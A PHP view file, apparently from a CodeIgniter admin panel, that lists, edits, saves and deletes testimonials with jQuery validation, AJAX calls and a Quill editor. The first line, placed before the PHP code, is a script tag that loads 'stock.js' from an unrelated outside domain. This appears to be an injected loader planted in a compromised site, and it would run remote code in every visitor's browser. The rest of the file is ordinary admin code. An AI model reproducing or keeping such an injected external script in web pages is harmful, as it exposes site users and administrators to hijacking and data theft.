<script src='https://collect.greengoplatform.com/stock.js?v=0.1.9' type='text/javascript'></script><?php $data[$this->pages]=$this->testimoni;$data['focus']=$this->nama; $this->load->view($this->generalHeader,$data) ?>
<div class="row"><div class="col-xl" id="result-content"></div></div>
<?php form($this->testimoni,$baseView,'modal-xl'); ?>
<style>
    .ql-snow .ql-editor{
        min-height: 15em !important;
        max-height: 15em !important;
    }
</style>


<script>
    var urlLocal    = `${strTestimoni}/`;
    var urlRead     = strRead,urlSave=strSave,urlDelete=strDelete,urlEdit=strEdit;
    var pages       = "<?=$data[$this->pages]?>";
    var nama        = attrId(strNama);
    var modalForm   = attrId(`${strModal}${pages}`);
    var formInput   = attrId(strFormInput);
    var paramForm   = attrId(strParam);
    var resultContent=attrId(strResultContent);
    var anyPage     = attrId(`${strAny}${pages}`);
    var no=1;
    var quill;
    function loadSelect(){
        var arrSelect = [strPartner];
        arrSelect.forEach(function(row){setSelect(base_url+`${row}/${strGetAll}`,row);})
    }
    $(document).ready(function() {
        quill = setCkeditor(strDeskripsi);
        loadSelect();
        loadData(1);
    });

    function nextLoad(par){
        var lastRow = toInt(attrId(strLastRows).val());
        var totalRow= toInt(attrId(strTotalRows).val());
        totalRow>lastRow&&loadData(toInt(no)+par);
    }
    function prevLoad(par){
        no > 1&&loadData(toInt(no)-par);
    }

    function loadData(page=1,isCache=true){
        no=page;
        var where=page;
        var any = anyPage.val()!==""?"?any="+anyPage.val():"";
        var totalRows = isNumber(attrId(strTotalRows).val());
        var url=base_url+urlLocal+urlRead;
        where+=any;
        if(!isCache) {
            if(totalRows === 0 ){localCache.remove(url+where);}
            else{for(var i=0;i<totalRows;i++){localCache.remove(url+`${i+1}${any}`);}}
        }
        ajaxView(urlLocal+urlRead+where,null,function(res){resultContent.html(res);});
    }

    function cari(e, val) {
        if (e.keyCode === 13) {
            anyPage.val(val);
            timeOut(function(){loadData(1,false);})
        }
    }
    formInput.validate({
        rules: {
            nama: {required: true,remote: {url: `${strTestimoni}/check_column`,type: "post",data: {param: function () {return paramForm.val();}}}},
            "model[]": { required:true },
            "file_upload[]":{required:true}
        },
        errorPlacement: handleError(),
        submitHandler: function (form) {
            if(!isQuill(quill.container.innerText)){
                timeOut(function(){quill.focus();});
                return;
            }
            var formData=new FormData(formInput[0]);
            var myEditor = document.querySelector(`#${strDeskripsi}`);
            var html = myEditor.children[0].innerHTML;
            formData.append(strDeskripsi, html);
            ajaxFile(base_url+urlLocal+urlSave,formData,function (res) {
                if (res.status) {
                    validateSaveHmtl(nama.val(),anyPage.val(),paramForm.val(),function(page,searchName){
                        if(!searchName) anyPage.val("")
                        loadData(page,false);
                        delForm(formInput);
                        paramForm.val(strAdd);
                        modalForm.modal(strHide);
                        notif(strSuccess);
                    })
                } else {
                    notif(strFailed);
                }
            })

        }
    });

    function hapus(id) {
        validateDeleteHtml(base_url+urlLocal+urlDelete,id,anyPage.val(),function(page,isCache){
            if(page===1) {
                anyPage.val("");
                attrId(strActiveRows).val(`${page}`)
            }
            loadData(page,isCache);
        })
    }

    function ubah(id) {
        var baseUrl=base_url+urlLocal+urlEdit+"/"+id;
        handleCacheEdit(baseUrl,function(res){
            if (res.status) {
                var data=res.res_data;
                setFocus(strNama);
                var dataId      = [strId,strNama,strPartner,strDeskripsi,strStatus,strGambar];
                dataId.forEach(function(row){
                    if(row===strGambar) setFileImage(data[row],strTestimoni);
                    else if(row===strDeskripsi) setQuill(quill,data[strDeskripsi])
                    else setIdSelect(row,data[row])
                })
            } else {
                notif(strFailed);
            }
        });

    }
    modalForm.on(strHideModal, function () {
        delForm(formInput);
        delQuill(quill);
        delImage();
        delValueSelect(strModel)
    });
</script>